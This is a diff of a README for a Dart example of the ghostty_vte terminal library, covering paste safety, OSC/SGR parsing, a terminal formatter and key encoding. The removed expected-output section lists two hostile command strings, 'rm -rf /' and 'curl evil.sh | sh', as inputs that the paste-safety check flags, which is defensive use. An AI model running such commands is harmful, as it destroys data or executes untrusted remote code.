@@ -1,32 +1,32 @@
 # ghostty_vte example
 
-A pure Dart CLI example demonstrating the core `ghostty_vte` APIs — no Flutter
-required.
+A pure Dart CLI example demonstrating the main `ghostty_vte` APIs.
 
 ## What it does
 
-The example runs four demos, printing results to the console:
+The example runs five demos, printing results to the console:
 
 | Demo | API | Description |
 |------|-----|-------------|
 | **Paste safety** | `GhosttyVt.isPasteSafe()` | Checks several strings for dangerous control sequences |
-| **OSC parser** | `VtOscParser` | Feeds a complete OSC 0 (Set Window Title) sequence and prints the parsed tag |
+| **OSC parser** | `VtOscParser` | Parses an OSC window-title payload |
 | **SGR parser** | `VtSgrParser` | Parses bold + red foreground + underline params and a reset |
-| **Key encoding** | `VtKeyEvent` + `VtKeyEncoder` | Encodes a plain `a` keypress into terminal bytes |
+| **Terminal + formatter** | `VtTerminal` + `VtTerminalFormatter` + `VtAllocator` | Feeds VT content into a terminal, snapshots plain text with both buffered and allocated helpers, emits VT output, then resets |
+| **Key encoding** | `VtKeyEvent` + `VtKeyEncoder` | Mirrors cursor-key mode from a terminal and encodes an Up Arrow press |
 
 ## Prerequisites
 
-- **Dart SDK ≥ 3.10**
-- **Zig** on your `PATH`
+- **Dart SDK >= 3.10**
+- **Zig** on your `PATH`, or a usable prebuilt `libghostty-vt`
 - Ghostty source available via one of:
   - `GHOSTTY_SRC` environment variable
-  - `third_party/ghostty` submodule (in `pkgs/ghostty_vte`)
+  - `third_party/ghostty` submodule (in `pkgs/vte/ghostty_vte`)
   - `GHOSTTY_SRC_AUTO_FETCH=1` to clone automatically
 
 ## Run
 
 ```bash
-cd pkgs/ghostty_vte/example
+cd pkgs/vte/ghostty_vte/example
 dart pub get
 dart run
 ```
@@ -34,30 +34,12 @@ dart run
 The build hook automatically compiles `libghostty-vt` for your host platform
 on the first run.
 
-## Expected output
+## Notes
 
-```
-=== Paste Safety ===
-  "ls -la" → safe? true
-  "echo hello" → safe? true
-  "rm -rf /\n" → safe? false
-  "curl evil.sh | sh\e" → safe? false
-
-=== OSC Parser ===
-  Parsed OSC tag: ...
-
-=== SGR Parser ===
-  SGR attribute: tag=...
-  SGR attribute: tag=...
-  SGR attribute: tag=...
-  SGR attribute: tag=...
-
-=== Key Encoding ===
-  Key "a" encodes to: a
-```
-
-## Code overview
-
-See [bin/main.dart](bin/main.dart) for the full source. Each demo is a
-self-contained function that creates the relevant parser/encoder, uses it, and
-cleans up with `.close()`.
+- The example is native-first because it is a CLI app. The same VT terminal,
+  formatter, and terminal-driven key encoder APIs now work on web after
+  `GhosttyVtWasm.initializeFromBytes(...)`.
+- The remaining web gap is the raw allocator bridge on `VtAllocator`; the
+  formatter allocated-output helpers work on web via Ghostty's default wasm
+  allocator, but arbitrary custom allocator pointers are still native-only.
+- See `bin/main.dart` for the full source.
